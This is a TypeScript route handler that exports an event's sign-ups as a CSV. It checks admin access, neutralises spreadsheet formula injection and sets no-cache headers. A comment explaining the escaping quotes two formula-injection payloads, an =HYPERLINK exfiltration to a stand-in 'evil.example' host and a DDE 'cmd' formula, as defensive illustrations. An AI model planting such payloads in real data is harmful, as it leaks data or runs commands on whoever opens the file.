import {requireAdmin} from "@/app/admin/_lib/auth";
import {loadAdminEvent, loadRegistrations} from "@/app/admin/_lib/events";

/**
 * One event's sign-ups, as a spreadsheet.
 *
 * 🔴 THE `(protected)` LAYOUT DOES NOT GUARD THIS FILE. Layouts wrap PAGES;
 * a route handler is reached directly and no layout runs for it at all. So the
 * guard below is not belt-and-braces the way it is on a page, it is the ONLY
 * thing standing between an anonymous GET and a CSV of members of the public
 * with their mobile numbers and email addresses. Do not remove it on the
 * grounds that the folder is called "protected".
 */
export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Escapes one CSV cell.
 *
 * 🔴 THE LEADING APOSTROPHE IS A SECURITY CONTROL, NOT A FORMATTING QUIRK.
 *
 * Excel, Numbers and Google Sheets all execute a cell beginning with `=`, `+`,
 * `-`, `@`, tab or carriage return as a FORMULA. Every name and email in this
 * file arrived from a public, unauthenticated form, so a registration filed as
 * `=HYPERLINK("https://evil.example?x="&A1,"click")` becomes a live link inside
 * MAZJ's own spreadsheet, and `=cmd|'/c calc'!A1` is the same class of thing
 * with a worse ending. The victim is whoever opens the download, which is the
 * owner.
 *
 * Prefixing with a single quote makes the spreadsheet treat it as text. The
 * quote is not shown in the cell.
 */
function cell(value: string | null): string {
  const raw = value ?? "";
  const neutralised = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
  // Standard RFC 4180 quoting on top: doubled quotes, and wrap anything
  // containing a comma, a quote or a newline.
  return `"${neutralised.replace(/"/g, '""')}"`;
}

/**
 * The body of a failure, chosen HERE.
 *
 * 🔴 Never the loader's own message. A download is the one place an upstream
 * string is most likely to be forwarded verbatim to somebody outside this
 * building, and a PostgREST error names our tables and columns.
 *
 * `text/plain` so a browser shows the sentence rather than offering to save it
 * as a spreadsheet called `<slug>-signups.csv` containing an error.
 */
const PLAIN = {"Content-Type": "text/plain; charset=utf-8"} as const;

export async function GET(
  _request: Request,
  {params}: {params: Promise<{id: string}>}
) {
  // 🔴 See the file header. This is the whole access control.
  const admin = await requireAdmin();
  const {id} = await params;

  const found = await loadAdminEvent(admin, id);

  // 🔴 404 means "there is no such event". It used to ALSO mean "the database
  // did not answer", which sends whoever is waiting for this file to look for
  // an event somebody has supposedly deleted.
  if (found.status === "missing") {
    return new Response("That event is not here. It may have been deleted.", {
      status: 404,
      headers: PLAIN,
    });
  }
  if (found.status === "unavailable") {
    return new Response(
      "The sign-ups could not be read. The database did not answer, so this file would be missing people rather than empty. Try again in a minute.",
      {status: 503, headers: PLAIN}
    );
  }

  const event = found.event;

  const registrations = await loadRegistrations(admin, id);
  if (registrations.status !== "ok") {
    return new Response(
      "The sign-ups could not be read. The database did not answer, so this file would be missing people rather than empty. Try again in a minute.",
      {status: 503, headers: PLAIN}
    );
  }

  const rows = [
    ["Name", "Mobile", "Email", "Status", "Language", "Rekaz reference", "Signed up"],
    ...registrations.rows.map((r) => [
      r.fullName,
      r.phoneE164,
      r.email,
      r.status,
      r.locale,
      r.rekazReference,
      r.createdAt,
    ]),
  ];

  const body = rows.map((row) => row.map(cell).join(",")).join("\r\n");

  // 🔴 UTF-8 BOM. Excel on Windows reads a BOM-less UTF-8 CSV as the local
  // codepage, so every Arabic name in the file opens as mojibake and the owner
  // concludes the sign-ups are corrupted. Every other tool ignores the BOM.
  const withBom = `﻿${body}\r\n`;

  return new Response(withBom, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${event.slug}-signups.csv"`,
      // Personal data. Never let a shared cache or a proxy keep a copy.
      "Cache-Control": "no-store, private",
    },
  });
}
